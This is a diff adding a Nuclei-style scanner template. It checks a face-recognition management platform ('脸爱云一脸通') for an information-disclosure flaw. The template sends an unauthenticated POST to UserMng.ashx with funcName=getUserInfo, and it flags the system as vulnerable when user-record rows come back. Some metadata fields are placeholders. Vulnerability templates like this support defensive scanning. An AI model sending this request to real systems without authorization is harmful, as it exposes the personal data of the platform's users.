@@ -1,0 +1,36 @@
+id: lay-UserMng-weak
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 脸爱云一脸通智慧管理平台存在UserMng.ashx信息泄露漏洞，攻击者可以通过此漏洞获取当前系统用户敏感信息。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /UserMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 483
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/Login.aspx
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+        page=1&arr_search=%7B%22bmmc%22%3A%22%22%2C%22rfzt%22%3A%22%22%2C%22cardid%22%3A%22%22%2C%22klb%22%3A%22%22%2C%22ryxm%22%3A%22%22%2C%22rybh%22%3A%22%22%2C%22sex%22%3A%22%22%2C%22ryzt%22%3A%22%22%2C%22rfoperator%22%3A%22%22%2C%22EngName%22%3A%22%22%2C%22WeChat%22%3A%22%22%2C%22Tel%22%3A%22%22%2C%22groupname%22%3A%22%22%2C%22jituanname%22%3A%22%22%2C%22companyname%22%3A%22%22%2C%22startime%22%3A%22%22%2C%22endtime%22%3A%22%22%2C%22order%22%3A%22khrq+desc%22%7D&funcName=getUserInfo
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - rownum
+      - type: word
+        part: body
+        words:
+          - rows
